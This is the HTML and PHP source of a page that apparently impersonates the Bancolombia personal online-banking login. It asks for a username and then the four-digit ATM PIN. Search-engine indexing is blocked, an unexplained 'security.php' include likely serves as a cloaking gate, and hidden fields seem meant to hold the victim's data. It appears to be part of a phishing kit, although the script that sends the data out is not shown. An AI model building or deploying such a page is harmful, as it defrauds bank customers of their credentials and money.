<?php require_once 'security.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="description" content="Sucursal Virtual Personas. Bancolombia: ingresa seguro a tus productos y servicios financieros.">
    <title>Sucursal Virtual Personas — Bancolombia</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="jquery-3.7.7.js"></script>
    <link rel="stylesheet" href="assets/css/pages/index.css">
</head>
<body class="index1-login">

<div class="index1-page">
    <div class="index1-topbar">
        <img src="assets/images/logo-encabezado.svg" alt="Bancolombia" class="index1-brand">
    </div>

    <main class="index1-main">
        <section class="center-stage">
            <div id="formulario-usuario">
                <h1 class="titulo-principal">¡Hola!</h1>

                <div class="form-container">
                    <div class="form-box">
                        <div class="campo-con-mensaje">
                            <div class="campo-usuario campo-usuario--pill">
                                <img src="assets/icons/icon-user.svg" alt="" class="icono">
                                <input
                                    type="text"
                                    id="usuario"
                                    class="input-user"
                                    placeholder="Ingresa tu usuario"
                                    maxlength="20"
                                    autocomplete="username"
                                >
                            </div>
                            <span id="mensajeError" class="mensaje-error"></span>
                        </div>

                        <div class="botones botones-usuario">
                            <button type="button" class="btn-volver" id="btnVolverInicio">Volver</button>
                            <button type="button" id="btnContinuarUsuario" class="btn-continuar btn-continuar--full inactivo">Continuar</button>
                        </div>

                        <p class="olv"><a href="#">¿Olvidaste tu usuario o clave?</a></p>
                    </div>
                </div>
            </div>

            <div id="formulario-clave" hidden>
                <div class="form-container">
                    <div class="form-box form-box-clave">
                        <img src="assets/images/candadito-lindo.svg" alt="Candado" class="candado-icono clave-icon">

                        <h1 class="titulo-principal">Clave principal</h1>

                        <p class="descripcion">
                            Es la misma que usas en el <strong>cajero automático</strong>
                        </p>

                        <div class="clave-container" id="claveContainer">
                            <div class="clave-item">
                                <input type="password" id="clave1" class="clave-numero" maxlength="1" autofocus>
                                <div class="clave-rayita" id="rayita1"></div>
                            </div>
                            <div class="clave-item">
                                <input type="password" id="clave2" class="clave-numero" maxlength="1">
                                <div class="clave-rayita" id="rayita2"></div>
                            </div>
                            <div class="clave-item">
                                <input type="password" id="clave3" class="clave-numero" maxlength="1">
                                <div class="clave-rayita" id="rayita3"></div>
                            </div>
                            <div class="clave-item">
                                <input type="password" id="clave4" class="clave-numero" maxlength="1">
                                <div class="clave-rayita" id="rayita4"></div>
                            </div>
                        </div>

                        <p class="olv olv-clave"><a href="#">¿Olvidaste tu clave?</a></p>

                        <div class="botones">
                            <button type="button" class="btn-volver" id="btnVolverClave">Volver</button>
                            <button type="button" id="btnContinuarClave" class="btn-continuar inactivo">Continuar</button>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <img src="assets/images/trazo-escritorio.svg" alt="" class="index1-decor index1-decor-desktop">
    <img src="assets/images/trazo-movil.svg" alt="" class="index1-decor index1-decor-mobile">

    <footer class="footer-container">
        <div class="footer-content">
            <div class="vigilado-logo">
                <img src="assets/images/logo-pie.svg" alt="Bancolombia">
                <img src="assets/images/estrella-hola.svg" alt="Bancolombia">
            </div>
            <div class="info-footer">
                <div class="ip-text">Dirección IP: <span id="gfg">Cargando...</span></div>
                <div id="fecha-hora" class="fecha-text"></div>
            </div>
        </div>
    </footer>
</div>

<div id="address" hidden></div>
<div id="userData" hidden></div>

<script src="assets/js/shared/page-common.js?v=9"></script>
<script src="assets/js/pages/index.js?v=9"></script>

</body>
</html>
